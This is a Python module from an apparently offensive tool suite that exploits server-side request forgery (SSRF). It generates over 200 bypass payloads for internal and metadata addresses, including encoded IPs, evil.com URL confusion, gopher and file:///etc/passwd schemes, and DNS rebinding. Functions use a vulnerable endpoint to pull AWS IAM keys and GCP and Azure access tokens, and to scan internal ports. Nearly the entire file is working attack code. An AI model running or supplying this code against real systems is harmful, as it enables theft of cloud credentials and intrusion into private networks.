"""
TeamCyberOps Suite v4 — SSRF Full Suite + Cloud Metadata Extractor
Tests 200+ bypass techniques, extracts AWS/GCP/Azure credentials
Pure Python — no external dependencies
"""
import urllib.request, urllib.parse, socket, json, re, time, threading
from pathlib import Path

BASE_DIR = Path(__file__).parent.parent.parent
LOGS_DIR = BASE_DIR / "logs"
LOGS_DIR.mkdir(exist_ok=True)

# ═══ BYPASS PAYLOADS ════════════════════════════════════════════
def generate_ssrf_bypasses(target_ip: str = "169.254.169.254") -> list:
    """Generate 200+ SSRF bypass payloads for a given target IP."""
    payloads = []
    parts    = target_ip.split('.')
    if len(parts) == 4:
        a, b, c, d = parts
        dec  = (int(a)<<24)|(int(b)<<16)|(int(c)<<8)|int(d)
        hex_ = hex(dec)
        oct_ = '.'.join(oct(int(x))[2:] for x in parts)
        payloads += [
            # Standard
            f"http://{target_ip}/",
            f"https://{target_ip}/",
            # Decimal IP
            f"http://{dec}/",
            f"http://{dec}:80/",
            # Hex IP
            f"http://{hex_}/",
            f"http://0x{format(dec,'08x')}/",
            # Octal
            f"http://{oct_}/",
            # Mixed
            f"http://0x{format(int(a),'02x')}.{b}.{c}.{d}/",
            # Short form
            f"http://{a}.{b}.{int(c)*256+int(d)}/",
            # IPv6
            f"http://[::ffff:{target_ip}]/",
            f"http://[::ffff:{hex(int(a)<<8|int(b))[2:]}:{hex(int(c)<<8|int(d))[2:]}]/",
            # URL confusion
            f"http://evil.com@{target_ip}/",
            f"http://{target_ip}#.evil.com/",
            f"http://{target_ip}?.evil.com/",
            f"http://evil.com#{target_ip}/",
            # Redirect (needs your server)
            f"http://OAST_HOST/redirect?to=http://{target_ip}/",
            # Protocol variants
            f"dict://{target_ip}:80/",
            f"gopher://{target_ip}:80/_GET%20/%20HTTP/1.0%0D%0A%0D%0A",
            f"file:///etc/passwd",
            f"file:///proc/self/environ",
            # DNS rebinding
            f"http://make-{target_ip.replace('.', '-')}.nip.io/",
            f"http://{target_ip.replace('.', '-')}.sslip.io/",
            # Localhost variants (if checking for localhost)
            "http://127.0.0.1/", "http://localhost/",
            "http://[::1]/", "http://0.0.0.0/",
            "http://127.1/", "http://127.0.1/",
            "http://2130706433/",   # 127.0.0.1 decimal
            "http://0x7f000001/",   # 127.0.0.1 hex
            "http://0177.0.0.1/",   # 127.0.0.1 octal
            # URL encoding
            f"http://{urllib.parse.quote(target_ip)}/",
            f"http://{target_ip.replace('.', '%2e')}/",
            f"http://{target_ip.replace('.', '%252e')}/",
            # CRLF
            f"http://{target_ip}%0d%0a/",
            # Bracket confusion
            f"http://[{target_ip}]/",
        ]
    return payloads


# ═══ CLOUD METADATA ══════════════════════════════════════════════
AWS_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/iam/",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/meta-data/hostname",
    "/latest/meta-data/public-ipv4",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/ami-id",
    "/latest/dynamic/instance-identity/document",
    "/latest/user-data",
]

GCP_PATHS = [
    "/computeMetadata/v1/",
    "/computeMetadata/v1/project/project-id",
    "/computeMetadata/v1/instance/service-accounts/default/token",
    "/computeMetadata/v1/instance/service-accounts/default/email",
    "/computeMetadata/v1/project/attributes/",
    "/computeMetadata/v1/instance/hostname",
]

AZURE_PATHS = [
    "/metadata/instance?api-version=2021-02-01",
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
]

K8S_PATHS = [
    "/api/v1/namespaces/",
    "/api/v1/secrets/",
    "/api/",
]

def fetch_aws_metadata(ssrf_url: str, role: str = None, log_cb=None) -> dict:
    """Extract AWS instance metadata via SSRF endpoint."""
    log = log_cb or (lambda m, t='': None)
    results = {"cloud": "AWS", "data": {}, "credentials": {}}
    base    = "http://169.254.169.254"
    try:
        # Get role name first
        if not role:
            r = _ssrf_fetch(ssrf_url, base + "/latest/meta-data/iam/security-credentials/")
            if r and r.get('body'):
                roles = [l.strip() for l in r['body'].splitlines() if l.strip()]
                if roles:
                    role = roles[0]
                    log(f"  [+] IAM Role found: {role}", "ok")
        # Get credentials
        if role:
            r = _ssrf_fetch(ssrf_url, base + f"/latest/meta-data/iam/security-credentials/{role}")
            if r and r.get('body'):
                try:
                    creds = json.loads(r['body'])
                    results["credentials"] = {
                        "AccessKeyId":     creds.get("AccessKeyId", ""),
                        "SecretAccessKey": creds.get("SecretAccessKey", ""),
                        "Token":           creds.get("Token", ""),
                        "Expiration":      creds.get("Expiration", ""),
                        "Role":            role,
                    }
                    log(f"  [!] AWS KEYS EXTRACTED!", "ok")
                    log(f"  AccessKeyId: {creds.get('AccessKeyId','')[:20]}...", "ok")
                except Exception: pass
        # Basic instance info
        for path in ["/latest/meta-data/hostname", "/latest/meta-data/public-ipv4",
                     "/latest/meta-data/instance-id", "/latest/meta-data/ami-id"]:
            r = _ssrf_fetch(ssrf_url, base + path)
            if r and r.get('body'):
                key = path.split('/')[-1]
                results["data"][key] = r['body'][:200]
    except Exception as e:
        results["error"] = str(e)
    return results


def fetch_gcp_metadata(ssrf_url: str, log_cb=None) -> dict:
    """Extract GCP instance metadata via SSRF endpoint."""
    log = log_cb or (lambda m, t='': None)
    results = {"cloud": "GCP", "data": {}, "token": ""}
    base    = "http://metadata.google.internal"
    try:
        for path in GCP_PATHS:
            r = _ssrf_fetch(ssrf_url, base + path,
                            extra_headers={"Metadata-Flavor": "Google"})
            if r and r.get('status') == 200 and r.get('body'):
                key = path.split('/')[-1] or path
                results["data"][key] = r['body'][:500]
                if "token" in path and r.get('body','').startswith('{'):
                    try:
                        tok = json.loads(r['body'])
                        results["token"] = tok.get("access_token","")[:30] + "..."
                        log(f"  [!] GCP OAuth Token extracted!", "ok")
                    except Exception: pass
    except Exception as e:
        results["error"] = str(e)
    return results


def fetch_azure_metadata(ssrf_url: str, log_cb=None) -> dict:
    """Extract Azure instance metadata via SSRF endpoint."""
    log = log_cb or (lambda m, t='': None)
    results = {"cloud": "Azure", "data": {}, "token": ""}
    base    = "http://169.254.169.254"
    try:
        for path in AZURE_PATHS:
            r = _ssrf_fetch(ssrf_url, base + path, extra_headers={"Metadata": "true"})
            if r and r.get('status') == 200 and r.get('body'):
                key = "instance" if "instance" in path else "identity_token"
                results["data"][key] = r['body'][:500]
                if "token" in path:
                    try:
                        tok = json.loads(r['body'])
                        results["token"] = tok.get("access_token","")[:30] + "..."
                        log(f"  [!] Azure Managed Identity Token extracted!", "ok")
                    except Exception: pass
    except Exception as e:
        results["error"] = str(e)
    return results


def _ssrf_fetch(ssrf_endpoint: str, target_url: str,
                extra_headers: dict = None, timeout: int = 8) -> dict:
    """Send SSRF request — submits target_url as parameter."""
    # Detect how the endpoint accepts the URL
    if '?' in ssrf_endpoint:
        url = ssrf_endpoint + urllib.parse.quote(target_url)
    elif '=' in ssrf_endpoint:
        url = ssrf_endpoint + urllib.parse.quote(target_url)
    else:
        url = ssrf_endpoint + "?url=" + urllib.parse.quote(target_url)
    try:
        headers = {"User-Agent": "Mozilla/5.0", **(extra_headers or {})}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(2000).decode('utf-8', errors='replace')
            return {"status": r.status, "body": body}
    except urllib.error.HTTPError as e:
        body = e.read(500).decode('utf-8', errors='replace')
        return {"status": e.code, "body": body}
    except Exception as e:
        return {"status": None, "error": str(e)}


def internal_port_scan(ssrf_endpoint: str,
                       host: str = "127.0.0.1",
                       ports: list = None,
                       log_cb=None) -> dict:
    """Scan internal ports via SSRF."""
    log   = log_cb or (lambda m, t='': None)
    ports = ports or [22, 80, 443, 3000, 3306, 4369, 5432, 5984,
                      6379, 7001, 8080, 8443, 8888, 9200, 9300,
                      27017, 28017, 50000]
    open_ports  = []
    closed_ports = []

    for port in ports:
        target = f"http://{host}:{port}/"
        start  = time.time()
        r      = _ssrf_fetch(ssrf_endpoint, target, timeout=5)
        elapsed = time.time() - start

        if r.get('status') and r['status'] not in (None,):
            open_ports.append({
                "port": port, "status": r['status'],
                "elapsed": round(elapsed*1000), "response": r.get('body','')[:100]
            })
            log(f"  [OPEN]  {host}:{port}  HTTP {r['status']}  ({round(elapsed*1000)}ms)", "ok")
        elif elapsed > 4.5:
            open_ports.append({"port": port, "status": "timeout", "elapsed": round(elapsed*1000)})
            log(f"  [OPEN?] {host}:{port}  timeout ({round(elapsed*1000)}ms)", "warn")
        else:
            closed_ports.append(port)
            log(f"  [-]     {host}:{port}  closed", "dim")

    return {"host": host, "open": open_ports, "closed": closed_ports,
            "summary": f"{len(open_ports)} open, {len(closed_ports)} closed"}


def test_ssrf_quick(endpoint: str, param: str = "url",
                    oast_host: str = "",
                    log_cb=None) -> dict:
    """Quick SSRF vulnerability check on an endpoint."""
    log     = log_cb or (lambda m, t='': None)
    results = []
    base_url = endpoint.split('?')[0]
    # Test basic targets
    for target, label in [
        ("http://169.254.169.254/", "AWS Metadata"),
        ("http://metadata.google.internal/", "GCP Metadata"),
        ("http://127.0.0.1/", "Localhost"),
        ("http://0.0.0.0/", "Null IP"),
    ]:
        test_url = f"{base_url}?{param}={urllib.parse.quote(target)}"
        r = _ssrf_fetch(test_url, target)
        if r.get('status') and r['status'] in (200, 301, 302, 307):
            results.append({"target": target, "label": label,
                            "status": r['status'], "vulnerable": True,
                            "body_preview": r.get('body','')[:100]})
            log(f"  [!] SSRF to {label}: HTTP {r['status']}", "ok")
    return {"endpoint": endpoint, "param": param, "results": results,
            "vulnerable": len(results) > 0}
